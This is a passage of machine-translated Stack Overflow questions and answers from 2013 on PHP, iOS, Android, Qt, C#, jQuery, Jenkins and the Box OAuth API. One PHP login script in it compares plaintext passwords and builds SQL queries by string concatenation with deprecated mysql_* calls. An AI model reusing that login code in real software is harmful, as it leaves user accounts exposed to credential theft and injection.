//Add header with XML version 1.0
MSXML2::IXMLDOMProcessingInstructionPtr ptrPI = m_docPtr->createProcessingInstruction(L"xml", L"version='1.0' encoding='UTF-8'");
m_docPtr->insertBefore(ptrPI, m_docPtr->documentElement.GetInterfacePtr());

//Add header with XML stylesheet
MSXML2::IXMLDOMProcessingInstructionPtr ptrPI1 = m_docPtr->createProcessingInstruction(L"xml-stylesheet", L"type='text/xsl' href='test1.xsl");
m_docPtr->insertBefore(ptrPI1, m_docPtr->documentElement.GetInterfacePtr()); 
```

# php - 从图像函数查询中删除“p”标签 v

> ID：15111677
> 
> 赞同：0
> 
> 时间：2013-02-27T12:04:29.040
> 
> 标签：php, image, wordpress

我找到了一种解决方案，可以在创建帖子时从图像中删除 p 标签，但该帖子仅适用于一个图像。

对于它适用的图像，我查看了萤火虫，这就是显示的内容：

```
<div class="entry-content">
<a href="http://localhost:8888/wordpress/wp-content/uploads/2013/02/img-1.png">
<img class="alignnone size-full wp-image-50" width="520" height="320" src="http://localhost:8888/wordpress/wp-content/uploads/2013/02/img-1.png" alt="img-1">
</a> 
```

等等....太棒了！

但是当我将另一张图片上传到另一篇文章时，会发生这种情况：

```
<p>
<img class="alignnone size-full wp-image-50" width="520" height="320" src="http://localhost:8888/wordpress/wp-content/uploads/2013/02/img-1.png" alt="img-1">
<br>
Lorem ipsum dolo....
</p> 
```

这是我在函数文件中使用的函数：

```
<?php
function filter_ptags_on_images($content){
    return preg_replace('/<p>\s*(<a .*>)?\s*(<img .* \/>)\s*(<\/a>)?\s*<\/p>/iU', '\1\2\3', $content);
}
add_filter('the_content', 'filter_ptags_on_images');
?> 
```

那么有没有办法添加另一个“返回线”，它具有删除 p 标签的功能，当它刚刚

因为它似乎只在它的时候起作用

..？我希望这是有道理的！如果它有帮助，这是我的图像的 css：

```
width:100%;
height:auto;
min-width:320px;
} 
```

我只希望图像是我的帖子的全宽和使用段落标签的内容，正如我所说的那样，它适用于我的第一张图片，但不适用于其他任何图片！

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:13:33.657

`<p>`当您通过内容过滤器运行Wordpress 时，它会添加其他标签。如果您不想要任何额外的标签，则根本不要通过任何过滤器运行它，或者在过滤器文档中查找您认为可以使用的过滤器。

我认为您的解决方案很好，但我认为您的正则表达式只需要第一次出现。尝试使用`preg_match_all`您的正则表达式。

[http://codex.wordpress.org/Plugin_API/Filter_Reference](http://codex.wordpress.org/Plugin_API/Filter_Reference)

# iphone - 当其父视图从外部弹出时如何关闭 UIAlertView？

> ID：15111680
> 
> 赞同：1
> 
> 时间：2013-02-27T12:04:33.260
> 
> 标签：iphone, ios, cocoa-touch, uialertview, popviewcontroller

我在这样的函数调用中在本地显示了一个警报视图......

```
 UIAlertView *alert_local = [[UIAlertView alloc]
                                    initWithTitle:nil
                                    message:@"Are you sure want to discard what you have recorded so far?"
                                    delegate:self cancelButtonTitle:@"Yes"
                                    otherButtonTitles:@"No", nil];
        alert_local.tag = 4;
        [alert_local show]; 
```

但我没有对此做出回答是或否。在一个序列中，我弹出了从外部显示警报的视图，但警报视图仍然存在，我通过将警报视图设置为 ivar 来处理它。这是正确的方法吗？或任何其他方式来处理这种序列？为什么弹出其父视图后警报视图仍然存在？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T12:19:54.330

是的，如果视图控制器显示警报视图，它负责删除警报。

如果视图控制器可能因用户未触发的某些事件而消失，则它必须确保警报视图被解除。因此将其存储在 ivar 中似乎是合适的。我为此使用了一个弱 ivar，因为当它消失时没有必要保留视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:08:16.587

通过添加下面的行来试试这个`viewWillDisappear`

```
 [alert_local dismissWithClickedButtonIndex:alert_local.cancelButtonIndex animated:YES]; 
```

注意：-`UIAlertView`在 .h 文件中声明您的

# php - 在 PDO 中重置光标位置

> ID：15111681
> 
> 赞同：4
> 
> 时间：2013-02-27T12:04:32.987
> 
> 标签：php, mysql, pdo

```
$data=$stmt->fetchAll(); //Dumping the data shows the result. It is also setting the cursor at the end

while($data=$stmt->fetch())
{
//Does not enters loop
//If fetchAll() removes it work as usual
} 
```

我知道它不需要两次获取数据。但我的主要问题是如何重置 PDO 中的光标位置？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-27T12:09:52.280

AFAIK 无法使用 PDO 重置游标位置 - 这可能与与某些不支持重置内部游标的数据库的兼容性有关。

如果要对结果进行两次迭代，请将其提取到数组并迭代此数组：

```
<?php 
$results = $stmt->fetchAll();  
foreach($results as $row) {
    // first
}

foreach($results as $row) {
    // second
} 
```

**编辑**一些数据库支持可滚动游标。要使用它，请在方法中添加`PDO::CURSOR_SCROLL`标志`prepare`（请参阅[PDOetch 文档页面](http://php.net/manual/en/pdostatement.fetch.php)中的示例）。但这只会增加向前或向后移动的可能性，而不是完全倒带。此外，并非所有数据库都支持这种类型的游标（例如 MySQL 不支持）。

# android - android中相同文本视图中文本的2种不同颜色

> ID：15111684
> 
> 赞同：6
> 
> 时间：2013-02-27T12:04:38.507
> 
> 标签：android, textview, textcolor

我有一个 TextView 小部件，如下所示

```
<TextView 
        android:text="@string/inputText"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_weight="1" /> 
```

inputText 在 Strings.xml 中定义为

```
<String name="inputText">The value of input is positive now</String> 
```

现在，我希望整个文本以棕色显示，并且仅以绿色显示“正面”。

有什么办法吗？简而言之，我的问题是同时为同一个文本视图进行多种着色

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-02-27T12:10:43.947

这是这个问题的一个副本[Change text color of one word in a TextView](https://stackoverflow.com/questions/7221930/change-text-color-of-one-word-in-a-textview)。

```
String first = "This word is ";
String next = "<font color='#EE0000'>red</font>";
t.setText(Html.fromHtml(first + next)); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-02-27T12:11:26.397

您可以`CDATA`在您的内部`strings.xml`使用一些 HTML 格式存储您的字符串，并将`Html.fromHTML`其显示在您的`TextView`.

字符串.xml

```
<string name="inputText">
    <![CDATA[
      <p>The value of input is <font color='#00ff00'>positive</font> now.</p>
    ]]>
</string> 
```

Java 代码

```
myTextView.setText(Html.fromHtml(getString(R.string.inputText)); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-27T12:10:42.720

使用这种方法：用 html 格式化字符串

```
String text = "<font color=#cc0029>Text with Color first</font> <font color=#ffcc00>Text with Color second</font>";
yourtextview.setText(Html.fromHtml(text)); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-27T12:18:53.153

使用 Spannable 来做到这一点：

```
String text = "<font color='brown'>The value of input is </font><font color='green'> positive </font><font color='brown'> color </font>";
textView.setText(Html.fromHtml(text), TextView.BufferType.SPANNABLE); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-27T12:21:21.083

试试这个，

```
TextView tv = (TextView)findViewById(R.id.mytextview01);

SpannableString WordtoSpan = tv.getText();

WordtoSpan.setSpan(new ForegroundColorSpan(Color.GREEN), 23, 30, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);

tv.setText(WordtoSpan); 
```

# c++ - Qt，两个QWidget对象之间的简单连接

> ID：15111687
> 
> 赞同：1
> 
> 时间：2013-02-27T12:04:42.540
> 
> 标签：c++, qt

我有一个继承自 QMainWindow 的类和两个继承自 QWidget 的类。我将这两个 QWidget 对象添加到我的 QMainWindow 对象中，并且我想在这两个 QWidget 对象之间创建一个连接（其中一个包含 QPushButton 对象）。不幸的是，不想工作...

代码：

大型机：

```
#ifndef MAINFRAME_H
#define MAINFRAME_H

#include <QtGui/QMainWindow>
#include "DrawComponent.h"
#include "ControllComponent.h"

class MainFrame : public QMainWindow
{
    Q_OBJECT

public:
    DrawComponent *dComponent;
    ControllComponent *cComponent;
    MainFrame();

};

#endif 
```

```
#include "MainFrame.h"
#include "DrawComponent.h"
#include "ControllComponent.h"
#include <iostream>

using namespace std;

MainFrame :: MainFrame()
{   
    this->setGeometry(100, 100, 640, 480);

    this->dComponent = new DrawComponent(this);
    this->cComponent = new ControllComponent(this); 

    QObject::connect(this->cComponent->rysuj1, SIGNAL(clicked()), this, SLOT(dComponent->draw1));
} 
```

第一个 QWidget 类

```
#ifndef DRAWCOMPONENT_H
#define DRAWCOMPONENT_H

#include <QtGui/QMainWindow>
#include <qwidget.h>

class DrawComponent : public QWidget
{
    Q_OBJECT

public:
    DrawComponent(QMainWindow *parent);

public slots:
    void draw1();

};

#endif 
```

```
#include "DrawComponent.h"
#include <qpushbutton.h>
#include <qgridlayout.h>

using namespace std;

DrawComponent :: DrawComponent(QMainWindow *parent)
{
    this->setParent(parent);
    this->setGeometry(0, 0, 500, 480);

    QPalette p(palette());
    p.setColor(QPalette::Background, Qt::black);

    this->setPalette(p);
    this->setAutoFillBackground(true);
    this->show();
}

void DrawComponent :: draw1()
{
    QPalette p(palette());
    p.setColor(QPalette::Background, Qt::blue);

    this->setPalette(p);
} 
```

第二个 QWidget 类

```
#ifndef CONTROLLCOMPONENT_H
#define CONTROLLCOMPONENT_H

#include <QtGui/QMainWindow>
#include <qwidget.h>
#include <qpushbutton.h>

class ControllComponent : public QWidget
{
    Q_OBJECT

public:
    QPushButton *rysuj1;
    ControllComponent(QMainWindow *parent);

};

#endif 
```

```
#include "ControllComponent.h"
#include <qpushbutton.h>
#include <qgridlayout.h>

ControllComponent :: ControllComponent(QMainWindow *parent)
{
    this->setParent(parent);
    this->setGeometry(500, 0, 140, 480);

    QPalette p(palette());
    p.setColor(QPalette::Background, Qt::red);
    this->setPalette(p);
    this->setAutoFillBackground(true);

    this->rysuj1 = new QPushButton(tr("draw1"), this);
    this->rysuj1->setGeometry(45, 10, 50, 50);
    this->rysuj1->show();

    this->show();
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T12:10:30.203

您将`clicked()`信号从连接`rysuj1`到`draw1()`插槽的呼叫`dComponent`

```
QObject::connect(this->cComponent->rysuj1, SIGNAL(clicked()), 
                 this, SLOT(dComponent->draw1)); 
```

需要是

```
QObject::connect(this->cComponent->rysuj1, SIGNAL(clicked()), 
                 dComponent, SLOT(draw1())); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T12:10:38.837

```
dComponent->draw1 
```

不是插槽

看这里：

```
QObject::connect(&a, SIGNAL(valueChanged(int)),
                  &b, SLOT(setValue(int))); 
```

参数：1\. 对象，2\. 信号函数，3\. 对象，4\. 槽函数。

所以

```
QObject::connect(this->cComponent->rysuj1, SIGNAL(clicked()), dComponent, SLOT(draw1())); 
```

# javascript - 将 bootstrap-datepicker 迁移到 jQuery UI datepicker

> ID：15111692
> 
> 赞同：0
> 
> 时间：2013-02-27T12:04:54.687
> 
> 标签：javascript, jquery, twitter-bootstrap, jquery-ui-datepicker

在 bootstrap-datepicker [http://www.eyecon.ro/bootstrap-datepicker/](http://www.eyecon.ro/bootstrap-datepicker/)这个工作：

```
$('#form_field').datepicker().on('changeDate', calc_func); 
```

但在 jQuery UI 中不起作用。如何修复/更改它？ `changeDate`是 bootstrap-datepicker 中的事件

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:14:08.187

```
$(".date").datepicker({
    onSelect: function() {
        calc_func();
    }
}); 
```

当您在 jQuery 日历中选择或更改日期时，将调用该函数

# shared-libraries - 共享库，常用功能

> ID：15111697
> 
> 赞同：0
> 
> 时间：2013-02-27T12:05:16.907
> 
> 标签：shared-libraries

我正在构建两个共享库，它们具有相同的函数名称和不同的实现。

lib-xyz.so

lib-abc.so，我正在使用 lib-xyz.so 构建应用程序。在应用程序中，我使用 dlopen 加载 lib-abc.so。这两个库都具有相同名称和全局变量的函数。

当我运行应用程序时，lib-abc.so 中的函数正在调用 lib-xyz.so 中的常用函数，而不是它自己的 (lib-xyz.so)。与全局结构相同的情况。任何人都可以告诉如何解决这个问题并限制共享库地址空间。

# c# - 在 C# 中比较两个列表中的重复项

> ID：15111698
> 
> 赞同：3
> 
> 时间：2013-02-27T12:05:16.993
> 
> 标签：c#

我有两个这样的列表：

```
List<EmpData> colExistingEmpData;
List<EmpData> colExternalEmpData; 
```

他们每个人都将拥有具有相同 ID 的员工记录。我知道这听起来很奇怪，但这是我现在所处的真实情况！

对于 colExternalEmpData 中基于 EmpId 的每个员工，对 colExistingEmpData 进行检查

```
foreach (EmpData employee in colExternalEmpData)
{
  var queryResult = colExistingEmpData.FindAll(thisEmployee => thisEmployee.Id == employee.Id);

  if(querResult.count == 0)
  {
    // Mark as INSERT
  } 
  else if(querResult.count == 1)
  {
    // Mark as UPDATE
  }
  else // queryResult is more than 1
  {
    // data is duplicated mark as IGNORE
  }

  analysedData.Add(employee); 
```

当 colExistingEmpData 没有“Id”的重复值时，这可以正常工作

当 colExternalEmpData 中有重复项时，这意味着如果两个员工的“ID”与 123 相同，上述代码仍会将 id 为 123 的现有员工标记为更新，因为它在 colExistingEmpData 中找到了完全匹配，前提是 colExistingEmpData 只有一个具有该 ID 的记录。

当员工记录在任一来源中重复时，是否可以将其标记为“忽略”？

我不能使用 Dictionary 对象，我以前使用过它，但权力不喜欢这个想法。

问候。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:11:46.183

考虑只在等式中添加一个已处理的列表：

```
List<int> processed = new List<int>(); 
```

然后在循环的顶部添加以下代码：

```
if (processed.Contains(employee.Id)) { continue; }
processed.Add(employee.Id); 
```

所以你在检查另一个列表**之前这样做。**这是您要做的第一件事，因为您并不真正关心它是否已被处理。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T12:15:42.607

假设我正确理解了您的问题，您始终可以按employeeID 对ExternalList 进行排序，然后不使用Foreach 循环，只需使用while 循环并在id 相同时跳过员工。

这是 +- 代码的外观，简化为整数：

```
List<int> external = new List<int>() { 1, 2, 2, 5, 1, 3 };
List<int> internalList = new List<int>() { 1, 4, 5, 3 };
external.Sort();
int index = 0;
int item = -1;
while (index < external.Count)
{
    if (external[index] != item)
    {
       item = external[index];
       internalList.FindAll(t => t == item);
    }
    index++;
 } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T12:12:58.833

我不知道这是否有帮助，但为什么不合并两个列表，并删除重复项：-

```
var mergedList = list1.Union(list2).ToList(); 
```

你应该看看这个问题： -

[使用 linq 从两个对象列表创建列表](https://stackoverflow.com/questions/720609/merge-two-object-lists-with-linq)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-27T12:28:59.247

另一种方法是覆盖`Equals`and`GetHashCode`并使用`.Distinct()`

[MSDN](http://msdn.microsoft.com/en-us/library/ms173147%28VS.90%29.aspx)

# php - 如何制作多用户？

> ID：15111707
> 
> 赞同：-1
> 
> 时间：2013-02-27T12:05:41.457
> 
> 标签：php, html, mysql, sql

首先我从[http://www.webestools.com/scripts_tutorials-code-source-15-personal-message-system-in-php-mysql-pm-system-private-message-discussion.html得到这个编码](http://www.webestools.com/scripts_tutorials-code-source-15-personal-message-system-in-php-mysql-pm-system-private-message-discussion.html)

在此之前，我使用相同的编码创建用户页面和管理页面。我编辑相同的编码以查看不同的用户和管理页面。我同时在同一个浏览器上运行..它运行正常。但是对于这种编码，我让用户和管理员使用相同的编码、相同的浏览器并同时运行。我先以管理员身份登录，然后以用户身份登录。以用户身份登录后，我刷新管理页面。我在管理员中使用的会话更改为像用户页面一样。

连接.php

```
<?php
include('config.php');
?>
   <div class="header">
<a href="<?php echo $url_home; ?>"><img src="<?php echo $design; ?>/images/logo.png" alt="Members   Area" /></a>
</div>
<?php
//If the user is logged, we log him out
if(isset($_SESSION['username']))
{
//We log him out by deleting the username and userid sessions
unset($_SESSION['username'], $_SESSION['userid']);
?>
<div class="message">You have successfuly been loged out.<br />
<a href="<?php echo $url_home; ?>">Home</a></div>
<?php
}
else
{
$ousername = '';
//We check if the form has been sent
if(isset($_POST['username'], $_POST['password']))
{
//We remove slashes depending on the configuration
if(get_magic_quotes_gpc())
{
$ousername = stripslashes($_POST['username']);
$username = mysql_real_escape_string(stripslashes($_POST['username']));
$password = stripslashes($_POST['password']);
}
else
{
$username = mysql_real_escape_string($_POST['username']);
$password = $_POST['password'];
}
//We get the password of the user
$req = mysql_query('select password,id from users where username="'.$username.'"');
$dn = mysql_fetch_array($req);
//We compare the submited password and the real one, and we check if the user exists
if($dn['password']==$password and mysql_num_rows($req)>0)
{
//If the password is good, we dont show the form
$form = false;
//We save the user name in the session username and the user Id in the session userid
$_SESSION['username'] = $_POST['username'];
$_SESSION['userid'] = $dn['id'];
?>
<div class="message">You have successfuly been logged. You can access to your member area.<br />
<a href="<?php echo $url_home; ?>">Home</a></div>
<?php
}
else
{
//Otherwise, we say the password is incorrect.
$form = true;
$message = 'The username or password is incorrect.';
}
}
else
{ 
$form = true;
}
if($form)
{
//We display a message if necessary
if(isset($message))
{
echo '<div class="message">'.$message.'</div>';
}
//We display the form
?>
<div class="content">
<form action="connexion.php" method="post"> Please type your IDs to log in:<br />
<div class="center">
<label for="username">Username</label><input type="text" name="username" id="username"value="<?  
php echo htmlentities($ousername, ENT_QUOTES, 'UTF-8'); ?>" /><br />
<label for="password">Password</label><input type="password" name="password"   id="password" />br />
<input type="submit" value="Log in" />
</div> 
</form> 
</div>
<?php
}
}
?> 
```

索引.php

```
<?php
include('config.php')
?>

<?php
//We display a welcome message, if the user is logged, we display it username
?>
Hello<?php if(isset($_SESSION['username'])){echo ' '.htmlentities($_SESSION['username'],ENT_QUOTES, 'UTF-8');} ?>,<br />
Welcome on our website.<br />
You can <a href="users.php">see the list of users</a>.<br /><br />
 <?php
 //If the user is logged, we display links to edit his infos, to see his pms and to log out
 if(isset($_SESSION['username']))
 {
 //We count the number of new messages the user has
 $nb_new_pm = mysql_fetch_array(mysql_query('select count(*) as nb_new_pm from pm where  ((user1="'.$_SESSION['userid'].'" and user1read="no") or (user2="'.$_SESSION['userid'].'" and user2read="no")) and id2="1"'));
//The number of new messages is in the variable $nb_new_pm
 $nb_new_pm = $nb_new_pm['nb_new_pm'];
//We display the links
?>
<a href="edit_infos.php">Edit my personnal informations</a><br />
<a href="list_pm.php">My personnal messages(<?php echo $nb_new_pm; ?> unread)</a><br />
<a href="connexion.php">Logout</a>
<?php
}
else
{
//Otherwise, we display a link to log in and to Sign up
?>
<a href="sign_up.php">Sign up</a><br />
<a href="connexion.php">Log in</a>
<?php
}
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:24:36.857

您必须为您的会话添加一些新的管理员索引，如果普通用户在检查他是否是管理员后登录，则会像下面这样存储您正在使用的普通用户会话索引...... `$_SESSION['username']`等等。 . 如果是管理员登录，您可以存储类似的内容

```
$_SESSION['isAdmin'];
$_SESSION['adminName']; 
```

等等..然后您在管理面板中检查管理会话..然后根据会话变量决定显示什么和不显示什么，如果没有设置“isAdmin”，请要求登录..

# c# - 如何将 asp.net: 表停靠到我的网页，以便它（表停靠）动态调整到浏览器宽度？

> ID：15111708
> 
> 赞同：0
> 
> 时间：2013-02-27T12:05:44.903
> 
> 标签：c#, javascript, jquery, asp.net, css

1.  我的问题：

我有一个流畅的 CSS 设计布局，效果很好，尽管直到**我的 asp.net: table**把事情搞砸了！当用户减小浏览器大小或用户通过移动设备登录时，我的表格将自行扩展到它的实际宽度，大约为 1000 像素。

1.  我试图做什么：

我试过使用javascript代码来解决这个问题，它只有在我指定最大宽度时才有效，但我需要一种方法让这段代码知道屏幕的当前最大宽度

1.  我使用的代码：

剧本：

```
 <script language="javascript" type="text/javascript">

       $('#dvTableDock').width($('#dvPageWidth').width());

    </script> 
```

然后我创建一个样式：

```
.TableDock
    {
        overflow-x: auto;
        overflow-y: auto;
        width: 870px; // Need to dynamically specify width here
        height:200px;
        padding: 0 0 17px 0;
    } 
```

然后我添加一个获取屏幕宽度的 div 并将样式和脚本应用于包装表格的另一个标签：

```
<div id="dvScreenWidth" visible="false">
</div>
<div class="TableDock" id="dvTableDock">
 //table in here
</div> 
```

我想要的是让停靠栏知道何时显示水平滚动，即当屏幕宽度小于 1000 像素并且表格开始延伸到页面之外时。

我真的希望我已经在这个问题上说清楚了，但请让我知道需要哪些其他信息来帮助我。感谢任何帮助或纠正我的错误的人。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:19:45.670

而不是使用固定宽度（即像素单位）使用百分比。

```
.TableDock
    {
        overflow-x: auto;
        overflow-y: auto;
        width: 95%;
        height:200px;
        padding: 0 0 17px 0;
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T13:56:56.907

所以这是我自己的解决方案：

```
.TableDock
        {
            overflow-x: auto;
            overflow-y: auto;
            //Remove the width and height completely
            padding: 0 0 17px 0;
        } 
```

我通过完全删除宽度和高度解决了这个问题

# jenkins - Jenkins Sonar 在定期作业上失败，但在手动启动的作业上工作

> ID：15111709
> 
> 赞同：0
> 
> 时间：2013-02-27T12:05:45.230
> 
> 标签：jenkins, sonarqube, jenkins-plugins, sonar-runner

我将 Sonar 与 Sonar Runner 和 Jenkins 一起使用。奇怪的是，当我手动开始工作时，一切正常，但在周期性的夜间构建中它失败并说：

org.sonar.runner.RunnerException：目录中没有匹配模式“java”的文件

所以我知道 Sonar Runner 找不到我的源文件。但为什么会这样呢？我的意思是当我手动启动它时，声纳工作正常并使用源文件。我没有改变任何东西。是完全一样的工作...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-09T18:39:46.567

如果我将您的问题概括为“如果我的 Jenkins 工作在其他时间工作后随机失败，我该怎么办？” 我总是做的第一步是删除工作区并重新运行构建。您通常还可以将 SCM 插件配置为对源进行干净签出而不是更新。这在过去为我解决了问题。

# box-api - Box API 在获取访问令牌时总是返回无效的 grant_type 参数

> ID：15111710
> 
> 赞同：1
> 
> 时间：2013-02-27T12:05:48.180
> 
> 标签：box-api

我正在为 WP8 编写自己的 Box SDK 以充分利用 Tasks。我在获取访问令牌时遇到问题。我总是得到这个作为回报：

```
{"error":"invalid_request","error_description":"Invalid grant_type parameter or parameter missing"} 
```

我正在使用的代码（全部在 C# 中）是：

```
 internal const String TokenURL = "https://api.box.com/oauth2/token";

CloudHttpAsync.DownloadResponceStreamAsync
(
    CloudHttpAsync.PostAsync
    (
        TokenURL,
        new MemoryStream
        (
            UTF8Encoding.UTF8.GetBytes
            (
                HttpUtility.UrlEncode
                (
                    String.Format
                    (
                        "grant_type=authorization_code&code={0}&client_id={1}&client_secret={2}&redirect_uri={3}",
                        Code,
                        ClientID,
                        ClientSecret,
                        RedirectURI
                    )
                )
            )
        ),
        null,
        null
    ),
    null
).ContinueWith((AsyncStream) =>
    {
        try
        {
            if (AsyncStream.Exception != null)
            {
                TaskSource.TrySetException(AsyncStream.Exception.InnerExceptions);
                return;
            }

            String Result = "";
            using (StreamReader Reader = new StreamReader(AsyncStream.Result))
            {
                Result = Reader.ReadToEnd();
            }

            BoxAuthToken Token = JsonConvert.DeserializeObject<BoxAuthToken>(Result);
            TaskSource.TrySetResult(Token);
        }
        catch (Exception e)
        {
            TaskSource.TrySetException(e);
        }
    }); 
```

和

```
 public static Task<HttpWebResponse> PostAsync(String URL, Stream UploadData, IRequestSigner Signer, IProgress<NetworkProgress> Progress)
    {
        TaskCompletionSource<HttpWebResponse> TaskSource = new TaskCompletionSource<HttpWebResponse>();

        HttpWebRequest Request = WebRequest.CreateHttp(URL);
        Request.Method = "POST";

        if (Signer != null)
        {
            Signer.Sign(Request).ContinueWith((o) =>
            {
                if (o.Exception != null)
                {
                    TaskSource.TrySetException(o.Exception.InnerExceptions);
                    return;
                }

                UploadDataAsync(Request, UploadData, Progress).ContinueWith((AsyncRequest) =>
                {
                    if (AsyncRequest.Exception != null)
                    {
                        TaskSource.TrySetException(AsyncRequest.Exception.InnerExceptions);
                        return;
                    }

                    GetResponceAsync(Request).ContinueWith((AsyncResponce) =>
                    {
                        if (AsyncResponce.Exception != null)
                        {
                            TaskSource.TrySetException(AsyncResponce.Exception.InnerExceptions);
                            return;
                        }

                        TaskSource.TrySetResult(AsyncResponce.Result);
                    });
                });
            });
        }
        else
        {
            UploadDataAsync(Request, UploadData, Progress).ContinueWith((AsyncRequest) =>
            {
                if (AsyncRequest.Exception != null)
                {
                    TaskSource.TrySetException(AsyncRequest.Exception.InnerExceptions);
                    return;
                }

                GetResponceAsync(Request).ContinueWith((AsyncResponce) =>
                {
                    if (AsyncResponce.Exception != null)
                    {
                        TaskSource.TrySetException(AsyncResponce.Exception.InnerExceptions);
                        return;
                    }

                    TaskSource.TrySetResult(AsyncResponce.Result);
                });
            });
        }

        return TaskSource.Task;
    }

    internal static Task<HttpWebRequest> UploadDataAsync(HttpWebRequest Request, Stream Data, IProgress<NetworkProgress> Progress)
    {
        TaskCompletionSource<HttpWebRequest> TaskSource = new TaskCompletionSource<HttpWebRequest>();

        if (Data.Length != 0)
        {
            Request.ContentLength = Data.Length;
            Request.AllowWriteStreamBuffering = false;

            Request.BeginGetRequestStream(new AsyncCallback((IAR) =>
                {
                    try
                    {
                        using (Stream UploadStream = Request.EndGetRequestStream(IAR))
                        {
                            Int64 Upload = 0;
                            Int64 TotalUploaded = 0;
                            Int64 Total = Data.Length;
                            Byte[] Buffer = new Byte[4096];

                            while (TotalUploaded < Total)
                            {
                                Upload = Data.Read(Buffer, 0, Buffer.Length);
                                TotalUploaded += Upload;
                                UploadStream.Write(Buffer, 0, (Int32)Upload);

                                if (Progress != null)
                                {
                                    Progress.Report(new NetworkProgress()
                                    {
                                        Operation = NetworkOperation.Uploading,
                                        TotalBytes = Total,
                                        BytesProcessed = TotalUploaded
                                    });
                                }
                            }
                        }

                        TaskSource.TrySetResult(Request);
                    }
                    catch (Exception e)
                    {
                        TaskSource.TrySetException(e);
                    }
                }),
                null);
        }
        else
        {
            TaskSource.TrySetResult(Request);
        }

        return TaskSource.Task;
    }

    internal static Task<HttpWebResponse> GetResponceAsync(HttpWebRequest Request)
    {
        TaskCompletionSource<HttpWebResponse> TaskSource = new TaskCompletionSource<HttpWebResponse>();

        Request.BeginGetResponse(new AsyncCallback((IAR) =>
            {
                try
                {
                    HttpWebResponse Responce = (HttpWebResponse)Request.EndGetResponse(IAR);
                    TaskSource.TrySetResult(Responce);
                }
                catch (Exception e)
                {
                    if (e is WebException && (e as WebException).Response.ContentLength > 0)
                    {
                        TaskSource.TrySetResult((HttpWebResponse)(e as WebException).Response);
                    }
                    else
                    {
                        TaskSource.TrySetException(e);
                    }
                }
            }),
            null);

        return TaskSource.Task;
    }

    public static Task<StreamAndLength> GetResponceStreamAsync(Task<HttpWebResponse> Task)
    {
        TaskCompletionSource<StreamAndLength> TaskSource = new TaskCompletionSource<StreamAndLength>();

        Task.ContinueWith((AsyncHWR) =>
            {
                if (AsyncHWR.Exception != null)
                {
                    TaskSource.TrySetException(AsyncHWR.Exception.InnerExceptions);
                    return;
                }

                HttpWebResponse Responce = AsyncHWR.Result;
                TaskSource.TrySetResult( new StreamAndLength() { Stream = Responce.GetResponseStream(), Length = Responce.ContentLength });
            });

        return TaskSource.Task;
    }

    public static Task<MemoryStream> DownloadResponceStreamAsync(Task<HttpWebResponse> Task, IProgress<NetworkProgress> Progress)
    {
        TaskCompletionSource<MemoryStream> TaskSource = new TaskCompletionSource<MemoryStream>();

        GetResponceStreamAsync(Task).ContinueWith((AsyncStream) =>
            {
                if (AsyncStream.Exception != null)
                {
                    TaskSource.TrySetException(AsyncStream.Exception.InnerExceptions);
                    return;
                }

                MemoryStream MemStream = new MemoryStream();
                MemStream.SetLength(AsyncStream.Result.Length);

                Int64 CurrentRead = 0;
                Int64 TotalRead = 0;
                Int64 Total = AsyncStream.Result.Length;
                Byte[] Buffer = new Byte[4096];

                using (Stream DownloadStream = AsyncStream.Result.Stream)
                while (TotalRead < Total)
                {
                    CurrentRead = DownloadStream.Read(Buffer, 0, Buffer.Length);
                    MemStream.Write(Buffer, 0, (Int32)CurrentRead);
                    TotalRead += CurrentRead;

                    if (Progress != null)
                    {
                        Progress.Report(new NetworkProgress()
                        {
                            Operation = NetworkOperation.Downloading,
                            TotalBytes = Total,
                            BytesProcessed = TotalRead
                        });
                    }
                }

                MemStream.Position = 0;
                TaskSource.TrySetResult(MemStream);
            });

        return TaskSource.Task;
    }

    internal class StreamAndLength
    {
        public Stream Stream { get; set; }
        public Int64 Length { get; set; }
    } 
```

对不起，代码很多，我喜欢写通用的：）

编辑：原始响应（删除了 ClientID 和 Client Secret）

当 URL 编码每个值时：

```
POST https://api.box.com/oauth2/token HTTP/1.1
Accept: */*
Content-Length: 196
Accept-Encoding: identity
User-Agent: NativeHost
Host: api.box.com
Connection: Keep-Alive
Cache-Control: no-cache

grant_type=authorization_code&code=JknaLbfT6lAXmey3FLYrp9eg1jMbpFuQ&client_id=[subbed]&client_secret=[subbed]&redirect_uri=https%3a%2f%2fCloudBoxWP8 
```

返回：

```
HTTP/1.1 400 Bad Request
Server: nginx
Date: Fri, 01 Mar 2013 07:35:22 GMT
Content-Type: application/json
Connection: keep-alive
Set-Cookie: box_visitor_id=51305a3a187f34.52738262; expires=Sat, 01-Mar-2014 07:35:22 GMT; path=/; domain=.box.com
Set-Cookie: country_code=US; expires=Tue, 30-Apr-2013 07:35:22 GMT; path=/
Cache-Control: no-store
Content-Length: 99

{"error":"invalid_request","error_description":"Invalid grant_type parameter or parameter missing"} 
```

当 URL 编码整个字符串时：

```
POST https://api.box.com/oauth2/token HTTP/1.1
Accept: */*
Content-Length: 214
Accept-Encoding: identity
User-Agent: NativeHost
Host: api.box.com
Connection: Keep-Alive
Cache-Control: no-cache

